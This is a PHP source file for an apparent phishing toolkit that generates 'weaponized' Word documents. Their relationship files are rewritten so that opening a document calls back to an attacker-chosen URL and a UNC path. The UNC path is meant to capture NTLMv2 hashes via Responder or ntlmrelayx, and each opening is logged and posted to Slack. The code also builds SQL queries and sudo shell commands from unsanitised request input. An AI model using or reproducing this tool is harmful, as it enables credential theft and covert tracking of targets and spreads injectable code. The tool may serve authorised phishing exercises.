<?php

// Set Slack Webhook URL
$slackurl = "https://hooks.slack.com/services/YOUR_SLACK_INCOMING_WEBHOOK_TOKEN_HERE";
$slackchannel = "#YOUR_SLACK_CHANNEL_HERE";
$slackemoji = ":page_facing_up:";
$slackbotname = "Phished_Document";
$APIResultsURL = "https://YOUR_PHISHING_API_HERE/phishingdocs/results";

// Receives Required Parameters and Sets Variables
$ip = $_SERVER['REMOTE_ADDR'];
if(isset($_SERVER['HTTP_USER_AGENT'])){$useragent = $_SERVER['HTTP_USER_AGENT'];}else{$useragent = "";}
if(isset($_REQUEST['target'])){$target = $_REQUEST['target'];}
if(isset($_REQUEST['org'])){$org = $_REQUEST['org'];}
if(isset($_REQUEST['slackemoji'])){$slackemoji = $_REQUEST['slackemoji'];}
if(isset($_REQUEST['slackbotname'])){$slackbotname = $_REQUEST['slackbotname'];}

$slackbotname = $slackbotname." (".$ip.")";

// Makes Password Safe for DB
if(isset($target)){$target = stripslashes($target);}
if(isset($org)){$org = stripslashes($org);}
$ip = stripslashes($ip);

// Pulls in Required Connection Variables for DB
require_once '../dbconfig.php';

$dbname = "phishingdocs";

// Create connection
$conn = mysqli_connect($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

if(isset($target)){

// Looks Up Recent Requests to Prevent Flooding
$sqlselect = "SELECT * FROM requests WHERE IP = '$ip' AND Target = '$target' AND Org = '$org' AND Datetime >= NOW() - INTERVAL 7 SECOND;";
$resultselect = $conn->query($sqlselect);

// If There Isn't a Recent (Within 1 Second) Similar Request..
if(mysqli_num_rows($resultselect) == 0){

// Inserts Captured Information Into MySQL DB
$sql = "INSERT INTO requests (Datetime, IP, Target, Org, UA) VALUES (now(), '$ip','$target','$org','$useragent');";
$result = $conn->query($sql);



if($target != "" && $org != ""){

$orglink = "(<".$APIResultsURL."|".$org.">)";

$message = "Document opened by ".$target." at ".$orglink."!";

}

if($target == "" && $org != ""){

$orglink = "(<".$APIResultsURL."|".$org.">)";

$message = "Document opened at ".$orglink."!";

}

if($target != "" && $org == ""){

$targetlink = "(<".$APIResultsURL."|".$targetlink.">)";

$message = "Document opened by ".$targetlink."!";

}

if($target == "" && $org == ""){

}else{

// Send to Slack
$cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.'", "username": "'.$slackbotname.'", "text": "'.$message.'", "icon_emoji": "'.$slackemoji.'"}\' '.$slackurl.'';


exec($cmd);

}
}
}

else {

// If Not Receiving Document Phishing Requests.. Show Generate Options
?>
<HTML>
<HEAD>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
      @import url(https://fonts.googleapis.com/css?family=Roboto:400,500,700,300,100);

body {
  background-color: #1b1e24;
  font-family: "Roboto", helvetica, arial, sans-serif;
  font-size: 24px;
  font-weight: 400;
  text-rendering: optimizeLegibility;
}

div.table-title {
   display: block;
  margin: auto;
  max-width: 600px;
  padding:5px;
  width: 100%;
}

.table-title h3 {
   color: #fafafa;
   font-size: 20px;
   font-weight: 400;
   font-style:normal;
   font-family: "Roboto", helvetica, arial, sans-serif;
   text-shadow: -1px -1px 1px rgba(0, 0, 0, 0.1);
   text-transform:uppercase;
}

.table-title h2 {
   color: #fafafa;
   font-size: 26px;
   font-weight: 400;
   font-style:normal;
   font-family: "Roboto", helvetica, arial, sans-serif;
   text-shadow: -1px -1px 1px rgba(0, 0, 0, 0.1);
   text-transform:uppercase;
}


/*** Table Styles **/

.table-fill {
  background: white;
  border-radius:3px;
  border-collapse: collapse;
  height: 275px;
  margin: auto;
  max-width: 600px;
  padding:5px;
  width: 75%;
  box-shadow: 0 5px 10px rgba(0, 0, 0, 0.1);
  animation: float 5s infinite;
}

th {
  color:#FFFFFF;
  background:#d12128;
  border-bottom:4px solid #9ea7af;
  border-right: 1px solid #343a45;
  font-size:20px;
  font-weight: 120;
  padding:16px;
  text-align:center;
  text-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
  vertical-align:middle;
}

th:first-child {
  border-top-left-radius:3px;
}

th:last-child {
  border-top-right-radius:3px;
  border-right:none;
}

tr {
  border-top: 1px solid #C1C3D1;
  border-bottom-: 1px solid #C1C3D1;
  color:#666B85;
  font-size:16px;
  font-weight:normal;
  text-shadow: 0 1px 1px rgba(256, 256, 256, 0.1);
}

tr:hover td {
  background:#4E5066;
  color:#FFFFFF;
  border-top: 1px solid #22262e;
  border-bottom: 1px solid #22262e;
}

tr:first-child {
  border-top:none;
}

tr:last-child {
  border-bottom:none;
}

tr:nth-child(odd) td {
  background:#EBEBEB;
}

tr:nth-child(odd):hover td {
  background:#4E5066;
}

tr:last-child td:first-child {
  border-bottom-left-radius:3px;
}

tr:last-child td:last-child {
  border-bottom-right-radius:3px;
}

td {
  background:#FFFFFF;
  padding:10px;
  text-align:center;
  vertical-align:middle;
  font-weight:300;
  font-size:16px;
  text-shadow: -1px -1px 1px rgba(0, 0, 0, 0.1);
  border-right: 1px solid #C1C3D1;
}

td:last-child {
  border-right: 0px;
}

th.text-center {
  text-align: left;
}

th.text-center {
  text-align: center;
}

th.text-right {
  text-align: right;
}

td.text-center {
  text-align: left;
}

td.text-center {
  text-align: center;
}

td.text-right {
  text-align: right;
}

/* The Modal (background) */
.modal {
    display: none; /* Hidden by default */
    position: fixed; /* Stay in place */
    z-index: 1; /* Sit on top */
    left: 0;
    top: 0;
    width: 100%; /* Full width */
    height: 100%; /* Full height */
    overflow: auto; /* Enable scroll if needed */
    background-color: rgb(0,0,0); /* Fallback color */
    background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
}

/* Modal Content/Box */
.modal-content {
    background-color: #fefefe;
    margin: 15% auto; /* 15% from the top and centered */
    padding: 20px;
    border: 1px solid #888;
    width: 80%; /* Could be more or less, depending on screen size */
}

/* The Close Button */
.close {
    color: #aaa;
    float: right;
    font-size: 28px;
    font-weight: bold;
}

.close:hover,
.close:focus {
    color: black;
    text-decoration: none;
    cursor: pointer;
}

.boxsizingBorder {
    -webkit-box-sizing: border-box;
       -moz-box-sizing: border-box;
            box-sizing: border-box;
}

textarea
{
  width:100%;
}

td.input input {
    width: 100%;
    box-sizing: border-box;
    -moz-box-sizing: border-box;
    -webkit-box-sizing: border-box;
}

    </style>
<style>
/* Style buttons */
.btn {
  background-color: DodgerBlue;
  border: none;
  color: white;
  padding: 12px 30px;
  cursor: pointer;
  font-size: 20px;
}

/* Darker background on mouse-over */
.btn:hover {
  background-color: RoyalBlue;
}
</style>
</HEAD>
<BODY>
<FONT COLOR="#ffffff">
<?php
if(isset($_REQUEST['URL'])){

// Create Payload
$URL = $_REQUEST['URL'];
$HTTPValue = $_REQUEST['HTTPValue'];
$Target = $_REQUEST['Target'];
$Org = $_REQUEST['Org'];

$cmdcleanup = "sudo rm -rf /var/www/uploads/*;";
exec($cmdcleanup);

// File Upload Piece
$target_dir = "../../uploads/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
$uploadOk = 1;
$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));

// Check file size
if ($_FILES["fileToUpload"]["size"] > 15000000) {
    echo "Sorry, your file is too large.";
    $uploadOk = 0;
}
if ($_FILES["fileToUpload"]["size"] == 0) {
   //echo $_FILES["fileToUpload"]["size"];
    $uploadOk = 0;
}
// Allow certain file formats
if($imageFileType != "doc" && $imageFileType != "docx" && $imageFileType != "") {
    echo "Sorry, only Word documents are allowed.";
    $uploadOk = 0;
}
// Check if $uploadOk is set to 0 by an error
if ($uploadOk == 0) {
//    echo "Sorry, your file was not uploaded.";
// if everything is ok, try to upload file
} else {
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
//        echo "The file ". basename( $_FILES["fileToUpload"]["name"]). " has been uploaded.";
    } else {
//        echo "Sorry, there was an error uploading your file.";
    }
}

if($uploadOk == 1){

$cmd0 = "sudo cp '/var/www/uploads/".basename( $_FILES["fileToUpload"]["name"])."' /var/www/uploads/Phishing.docx;";
exec($cmd0,$output0);

//var_dump($output0);
//echo $cmd0;

$cmd1 = "sudo python InjectPayload.py \"".basename( $_FILES["fileToUpload"]["name"])."\";";
exec ($cmd1,$output1);

//var_dump($output1);
//echo $cmd1;

$cmd2 = "cd /var/www/uploads/ && sudo unzip -o Phishing.docx;";
exec ($cmd2,$output2);

//var_dump($output2);
//echo $cmd2;

$cmd3 = "ls /var/www/uploads/word/media -1 | sort -V | tail -2 |grep 'png'";
exec ($cmd3,$outputcmd2);

//echo $cmd3;
//var_dump($outputcmd2);

$cmd4 = 'sudo sed -i -e \'s~media/'.$outputcmd2[0].'\\"~'.$HTTPValue.'://'.$URL.'/phishingdocs?target='.$Target.'\&amp;org='.$Org.'\\" TargetMode=\\"External\\"~g\' /var/www/uploads/word/_rels/document.xml.rels;';
exec($cmd4,$output4);

//var_dump($output4);
//echo $cmd4;

$cmd5 = 'sudo sed -i -e \'s~media/'.$outputcmd2[1].'\\"~\\\\\\\\\\'.$URL.'/phishingdocs.jpg\\" TargetMode=\\"External\\"~g\' /var/www/uploads/word/_rels/document.xml.rels;';
exec($cmd5,$output5);

//var_dump($output5);
//echo $cmd5;

$cmd6 = "cd /var/www/uploads/ && sudo zip -r Phishing.docx word/_rels/document.xml.rels;";
exec($cmd6, $output6);

//var_dump($output6);
//echo $cmd6;

$cmd7 = "cp /var/www/uploads/Phishing.docx /var/www/html/phishingdocs/PhishingTEMPLATE.docx;";
exec($cmd7, $output7);

//var_dump($output7);
//echo $cmd7;

} else {

$cmd8 = "cp document.xml.rels.TEMPLATE word/_rels/document.xml.rels;";
exec($cmd8);

$cmd9 = "sed -i -e 's~HTTPVALUE~".$HTTPValue."~g' word/_rels/document.xml.rels;";
exec($cmd9);

$cmd10 = "sed -i -e 's~URLVALUE~".$URL."~g' word/_rels/document.xml.rels;";
exec($cmd10);

$cmd11 = "sed -i -e 's~TARGETVALUE~".$Target."~g' word/_rels/document.xml.rels;";
exec($cmd11);

$cmd12 = "sed -i -e 's~ORGVALUE~".$Org."~g' word/_rels/document.xml.rels;";
exec($cmd12);

$cmd13 = "sudo zip -r Phishing.docx word/_rels/document.xml.rels";
exec($cmd13);

}

?>
<CENTER>
<br><br>
<?php
if($uploadOk == 1){
?>
<form action="PhishingTEMPLATE.docx" method="get">
<?php } else { ?>
<form action="Phishing.docx" method="get">
<?php } ?>
<button class="btn" style="width:100%" type="submit"><i class="fa fa-download"></i>Download</button>
</form>
</CENTER>
<?php

}
else {
?>
<FORM METHOD="POST"  ACTION="<?php $_SERVER["PHP_SELF"]; ?>" enctype="multipart/form-data">
<CENTER>
<FONT COLOR="#ffffff"><H1>Create a Phishing Word Doc</H1></FONT><br>
<TABLE>
<TR>
<TH COLSPAN="2">API URL</TH><TH>Target</TH><TH>Orginization</TH>
</TR>
<TR>
<TD><SELECT NAME="HTTPValue"><option value="http">http</option><option value="https">https</option></SELECT></TD><TD><input type="text" name="URL" value="<?php echo $_SERVER['SERVER_NAME'];?>"></TD><TD><input type="text" name="Target" value="Joe Smith"></TD><TD><input type="text" name="Org" value="Evil Corp"></TD>
</TR>
<TR>
<TD COLSPAN="4">
<i>(<b>Optional</b> - Weaponize Your Own Document!)<i><br><br>
<input type="file" name="fileToUpload" id="fileToUpload">
</TD>
</TR>
</TABLE>
<br><br><button class="btn"><i class="fa fa-download" type="submit"></i>Generate Payload!</button>
</CENTER><br><br>
<FONT SIZE="3" COLOR="#ffffff"><p align="center">The generated Word doc will call back via HTTP to the Slack API specified in the API's php file.  Also, a UNC path will be created as well in an attempt to capture NTLMv2 SMB requests.  Make sure your server allows TCP 445 and you're running Responder or ntlmrelayx.py when the documents are opened for added fun! :)</p></FONT>
</FORM>

<?php

}

?>

</BODY>
</FONT>
</HTML>
<?php
}



printf($conn->error);
$conn->close();

?>
